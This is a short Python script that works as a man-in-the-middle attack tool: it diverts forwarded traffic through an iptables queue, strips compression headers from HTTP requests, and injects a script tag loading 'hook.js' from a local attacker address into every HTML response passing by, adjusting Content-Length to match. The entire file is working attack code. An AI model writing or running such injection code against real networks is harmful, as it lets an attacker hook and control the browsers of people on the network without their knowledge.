import scapy.all as scapy
import netfilterqueue
import subprocess
import re

ack_list = []
def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("request")
            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("response")
            injection_code = '<script src="http://192.168.0.108:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load =  load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))


    packet.accept()

try:
    while True:
        subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])

        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0,process_packet)
        queue.run()

except KeyboardInterrupt:
    print("\nflushing ip tables ")
    subprocess.call(["iptables","--flush"])
